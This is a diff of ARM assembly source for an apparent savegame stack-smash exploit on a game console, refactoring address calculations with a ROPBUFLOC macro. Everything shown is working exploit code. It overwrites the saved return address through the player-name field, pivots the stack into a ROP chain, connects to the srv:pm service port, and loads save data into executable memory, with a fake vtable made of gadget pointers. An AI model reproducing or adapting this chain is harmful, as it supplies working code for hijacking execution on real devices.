@@ -141,7 +141,7 @@ _start:
 @ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
 
 .word ROP_POPR3_ADDSPR3_POPPC @ Stack-pivot to ropstackstart.
-.word (ROPBUF + (ropstackstart - _start)) - (0x0ffffcc0+0x4)
+.word (ROPBUFLOC(ropstackstart) - (0x0ffffcc0+0x4))
 
 .space (_start + 0x180) - .
 ropstackstart:
@@ -152,7 +152,7 @@ CALLFUNC_NOSP CLOSEHANDLE, SRV_SESSIONHANDLE, 0, 0, 0
 .word 0 @ r4
 
 @ Outhandle is @ SRV_SESSIONHANDLE.
-CALLFUNC_NOSP svcConnectToPort, SRV_SESSIONHANDLE, (ROPBUF + (srvpm_string - _start)), 0, 0
+CALLFUNC_NOSP svcConnectToPort, SRV_SESSIONHANDLE, ROPBUFLOC(srvpm_string), 0, 0
 
 COND_THROWFATALERR
 
@@ -218,7 +218,7 @@ SENDCMD ROPBUF+0x1040, 0x00190040, ROPBUF+0x1200 @ ReloadDBS
 #endif
 
 #if EXECHAX==1 //This code exec method reads save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
-CALLFUNC_NOSP FS_MountSavedata, (ROPBUF + (savedata_archivename - _start)), 0, 0, 0
+CALLFUNC_NOSP FS_MountSavedata, ROPBUFLOC(savedata_archivename), 0, 0, 0
 
 CALLFUNC_NOSP IFile_Open, ROPBUF+0x1044, ROPBUF+0x1000, 1, 0
 
@@ -233,7 +233,7 @@ ROPMACRO_IFile_Close ROPBUF+0x1044
 #include "ropkit_boototherapp.s"
 
 ropkit_cmpobject:
-.word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
+.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
 .fill (0x40 / 4), 4, ROP_POPR3_ADDSPR3_POPPC @ Vtable
 #endif
 
